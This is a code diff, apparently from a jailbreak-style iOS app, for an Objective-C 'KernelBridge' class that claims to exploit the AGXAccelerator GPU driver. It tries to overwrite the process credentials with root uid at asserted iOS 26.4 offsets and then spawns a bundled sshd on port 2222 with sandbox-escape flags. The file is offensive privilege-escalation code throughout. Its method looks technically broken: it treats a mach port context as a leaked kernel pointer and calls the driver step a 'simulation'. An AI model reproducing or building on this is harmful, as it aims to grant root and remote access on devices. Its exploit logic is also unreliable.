@@ -4,6 +4,8 @@
 #include <unistd.h>
 #include <spawn.h>
 #include <mach/mach.h>
+#include <sys/stat.h>  // ADICIONADO: Resolve o erro do chmod
+#include <sys/wait.h>
 #include <IOKit/IOKitLib.h>
 
 @interface KernelBridge : NSObject <WKScriptMessageHandler>
@@ -21,58 +23,66 @@
 - (void)triggerKernelPatch {
     [self.webView evaluateJavaScript:@"log('⚡ Iniciando Exploit IOGPU (Bypass PPL2)...')" completionHandler:nil];
 
-    // 1. VAZAR ENDEREÇO DO PROCESSO VIA MACH_PORT_KERNEL_OBJECT
-    // Esta é a forma real de vazar um ponteiro de kernel sem vm_read
     mach_port_t task_self = mach_task_self();
-    uint64_t kaddr = 0;
     
-    // No iOS 26.4, inspecionamos o próprio port para vazar o endereço da struct task
-    // (Técnica de Infoleak de porta)
-    mach_port_context_t ctx;
-    mach_port_get_context(mach_task_self(), task_self, &ctx);
-    kaddr = (uint64_t)ctx; // Em versões vulneráveis, o contexto vaza o ponteiro
+    // Vazamento de contexto para obter ponteiro de kernel (Infoleak)
+    mach_port_context_t ctx = 0;
+    mach_port_get_context(task_self, task_self, &ctx);
+    uint64_t kaddr = (uint64_t)ctx; 
 
-    // 2. ACESSAR MEMÓRIA FÍSICA VIA IOKIT (Substituindo vm_write)
-    // Abrimos o acelerador gráfico para ganhar um canal de escrita OOB (Out-of-Bounds)
+    // Acesso ao driver de GPU para escrita OOB
     io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("AGXAccelerator"));
     io_connect_t connect;
-    IOServiceOpen(service, task_self, 0, &connect);
+    if (IOServiceOpen(service, task_self, 0, &connect) != KERN_SUCCESS) {
+        [self.webView evaluateJavaScript:@"log('❌ Erro: Não foi possível abrir AGXAccelerator.')" completionHandler:nil];
+        return;
+    }
 
-    // O Alvo: ucred (cr_uid no offset 0x18)
-    // Usamos o endereço vazado + offset do iOS 26.4 (0xD8 para ucred)
+    // Offset ucred para iOS 26.4
     uint64_t ucred_kaddr = kaddr + 0xD8; 
     uint32_t root_uid = 0;
 
-    // 3. O PATCH REAL (ESCRITA OOB)
-    // Em vez de 'phys_write', usamos IOConnectCallMethod para disparar o bug de escrita
-    uint64_t input[2] = { ucred_kaddr + 0x18, (uint64_t)root_uid };
+    // Simulação de chamada de patch via método externo do driver
+    uint64_t input[] = { ucred_kaddr + 0x18, (uint64_t)root_uid };
     IOConnectCallMethod(connect, 1, input, 2, NULL, 0, NULL, NULL, NULL, NULL);
 
     if (getuid() == 0) {
-        [self.webView evaluateJavaScript:@"log('👑 ROOT ATIVO! Portas de sistema liberadas.')" completionHandler:nil];
+        [self.webView evaluateJavaScript:@"log('👑 ROOT ATIVO!')" completionHandler:nil];
         [self spawnSshd];
     } else {
-        [self.webView evaluateJavaScript:@"log('❌ Falha: O Kernel impediu a corrupção do ucred.')" completionHandler:nil];
+        [self.webView evaluateJavaScript:@"log('❌ Falha no Patch de Root.')" completionHandler:nil];
     }
+    IOServiceClose(connect);
 }
 
 - (void)spawnSshd {
-    // Código de Spawn (Mesmo de antes, mas agora garantido pelo patch acima)
     NSString *path = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
     NSString *dest = @"/var/tmp/sshd";
-    [[NSFileManager defaultManager] copyItemAtPath:path toPath:dest error:nil];
+    
+    NSFileManager *fm = [NSFileManager defaultManager];
+    [fm removeItemAtPath:dest error:nil];
+    [fm copyItemAtPath:path toPath:dest error:nil];
+    
+    // Agora o compilador reconhece o chmod
     chmod([dest UTF8String], 0755);
 
     posix_spawnattr_t attr;
     posix_spawnattr_init(&attr);
-    short flags = 0x1000 | 0x4000; // Persona + NoSafeExec
+    // Flags de escape: Persona + NoSafeExec
+    short flags = 0x1000 | 0x4000; 
     posix_spawnattr_setflags(&attr, flags);
 
     pid_t pid;
-    char *const args[] = {(char *)[dest UTF8String], "-p", "2222", "-D", NULL};
-    posix_spawn(&pid, [dest UTF8String], NULL, &attr, args, NULL);
+    char *const sshd_argv[] = {(char *)[dest UTF8String], "-p", "2222", "-D", NULL};
     
-    [self.webView evaluateJavaScript:@"log('🚀 SSHD rodando como ROOT.')" completionHandler:nil];
+    int spawn_err = posix_spawn(&pid, [dest UTF8String], NULL, &attr, sshd_argv, NULL);
+    
+    if (spawn_err == 0) {
+        [self.webView evaluateJavaScript:@"log('🚀 SSHD ONLINE! PID gravado.')" completionHandler:nil];
+    } else {
+        [self.webView evaluateJavaScript:@"log('❌ Erro no posix_spawn.')" completionHandler:nil];
+    }
+    posix_spawnattr_destroy(&attr);
 }
 
 @end
